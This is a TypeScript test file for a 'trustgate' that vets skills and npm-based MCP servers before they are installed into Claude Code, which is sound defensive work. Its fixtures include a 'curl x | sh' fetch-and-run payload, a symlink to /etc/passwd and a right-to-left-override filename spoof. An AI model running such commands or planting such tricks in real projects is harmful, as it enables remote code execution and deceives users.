import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, chmodSync, symlinkSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { gateSkillSource, gateOrigin } from '../src/core/trustgate.js';
import { ClaudeCodeAdapter } from '../src/adapters/claude-code.js';
import { planInstall, planInstallSkill, execute } from '../src/core/orchestrator.js';
import { readLock, lockKey } from '../src/core/lock.js';

function tmp(): string {
  return mkdtempSync(join(tmpdir(), 'fleet-tg-'));
}

function hermeticClaude(dir: string): ClaudeCodeAdapter {
  const claudeJson = join(dir, '.claude.json');
  writeFileSync(claudeJson, JSON.stringify({ mcpServers: {} }));
  return new ClaudeCodeAdapter(
    claudeJson,
    join(dir, 'skills'),
    join(dir, 'CLAUDE.md'),
    join(dir, 'settings.json'),
    join(dir, 'plugins'),
  );
}

test('gateSkillSource: clean docs-only skill → ok', async () => {
  const dir = tmp();
  try {
    writeFileSync(join(dir, 'SKILL.md'), '# clean\nJust instructions.');
    const v = await gateSkillSource(dir);
    assert.equal(v.level, 'ok');
    assert.equal(v.reasons.length, 0);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('gateSkillSource: executables, symlinks and hidden unicode are each flagged', async () => {
  const dir = tmp();
  try {
    writeFileSync(join(dir, 'SKILL.md'), 'see‮exe.gnp‬'); // RTL override
    writeFileSync(join(dir, 'run.sh'), '#!/bin/sh\necho hi');
    chmodSync(join(dir, 'run.sh'), 0o755);
    symlinkSync('/etc/passwd', join(dir, 'link'));
    const v = await gateSkillSource(dir);
    assert.equal(v.level, 'caution');
    const text = v.reasons.join('\n');
    assert.match(text, /hidden\/bidirectional unicode/);
    assert.match(text, /executable file/);
    assert.match(text, /symlink/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('gateOrigin: unpinned npm → caution; pinned → ok', () => {
  assert.equal(gateOrigin({ type: 'npm', id: 'x' }).level, 'caution');
  assert.equal(gateOrigin({ type: 'npm', id: 'x', version: '1.0.0' }).level, 'ok');
  assert.equal(gateOrigin({ type: 'manual' }).level, 'ok');
});

test("policy 'warn': caution reasons land as change warnings; install proceeds", async () => {
  const dir = tmp();
  try {
    const a = hermeticClaude(dir);
    const plan = await planInstall(
      [a],
      { transport: 'stdio', command: 'npx', args: ['-y', 'unpinned-pkg'] }, // no version
      'up',
      'user',
      ['claude-code'],
      { trustPolicy: 'warn' },
    );
    assert.equal(plan.changes.length, 1);
    assert.match((plan.changes[0]!.warnings ?? []).join('\n'), /trust: unpinned npm/);
    assert.equal(plan.trust?.level, 'caution');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("policy 'block': caution-level skill plan becomes protected skips", async () => {
  const dir = tmp();
  try {
    const a = hermeticClaude(dir);
    const src = join(dir, 'sketchy');
    mkdirSync(src, { recursive: true });
    writeFileSync(join(src, 'SKILL.md'), 'hi');
    writeFileSync(join(src, 'payload.sh'), 'curl x | sh');
    chmodSync(join(src, 'payload.sh'), 0o755);
    const plan = await planInstallSkill([a], { name: 'sketchy', dir: src }, 'sketchy', ['claude-code'], {
      trustPolicy: 'block',
    });
    assert.equal(plan.changes.length, 0);
    assert.ok(plan.skips.some((s) => s.kind === 'protected' && /trust policy/.test(s.reason)));
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('verdict is recorded in fleet.lock on commit', async () => {
  const dir = tmp();
  try {
    const home = join(dir, 'home');
    const a = hermeticClaude(dir);
    const plan = await planInstall(
      [a],
      { transport: 'stdio', command: 'npx', args: ['-y', 'unpinned-pkg'] },
      'up',
      'user',
      ['claude-code'],
      { trustPolicy: 'warn' },
    );
    await execute([a], plan, { commit: true, fleetHome: home });
    const entry = (await readLock(home)).entries[lockKey('mcp-server', 'up', 'claude-code')];
    assert.equal(entry?.trust?.level, 'caution');
    assert.match(entry?.trust?.reasons.join('\n') ?? '', /unpinned/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// ── dual-review round-2 (merged Claude+codex findings) ──────────────────────

test('gateOrigin: @latest / ranges are NOT pinned', () => {
  assert.equal(gateOrigin({ type: 'npm', id: 'x', version: 'latest' }).level, 'caution');
  assert.equal(gateOrigin({ type: 'npm', id: 'x', version: '^1.2.0' }).level, 'caution');
  assert.equal(gateOrigin({ type: 'npm', id: 'x', version: '1.2.3-beta.1' }).level, 'ok');
});

test('gateSkillSource: extensionless shebang file is caught', async () => {
  const dir = tmp();
  try {
    writeFileSync(join(dir, 'SKILL.md'), 'clean');
    writeFileSync(join(dir, 'run'), '#!/bin/sh\ncurl x | sh'); // no ext, no +x
    const v = await gateSkillSource(dir);
    assert.equal(v.level, 'caution');
    assert.match(v.reasons.join('\n'), /script file/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('gateSkillSource: leading BOM alone is NOT flagged (benign editor artifact)', async () => {
  const dir = tmp();
  try {
    writeFileSync(join(dir, 'SKILL.md'), '\uFEFF# fine');
    const v = await gateSkillSource(dir);
    assert.equal(v.level, 'ok');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('gateSkillSource: every hidden-unicode range boundary trips the gate', async () => {
  for (const cp of ['\u061C', '\u200B', '\u200F', '\u202A', '\u202E', '\u2060', '\u2066', '\u2069']) {
    const dir = tmp();
    try {
      writeFileSync(join(dir, 'SKILL.md'), `x${cp}y`);
      const v = await gateSkillSource(dir);
      assert.equal(v.level, 'caution', `U+${cp.codePointAt(0)!.toString(16)} missed`);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  }
});

test('blocked DRY-RUN reports refused, not nothing-to-do', async () => {
  const dir = tmp();
  try {
    const a = hermeticClaude(dir);
    const plan = await planInstall(
      [a],
      { transport: 'stdio', command: 'npx', args: ['-y', 'unpinned'] },
      'up',
      'user',
      ['claude-code'],
      { trustPolicy: 'block' },
    );
    const { execute } = await import('../src/core/orchestrator.js');
    const { summarizeResult } = await import('../src/core/redact.js');
    const res = await execute([a], plan, { commit: false, fleetHome: join(dir, 'home') });
    assert.equal(summarizeResult(res).status, 'refused');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});
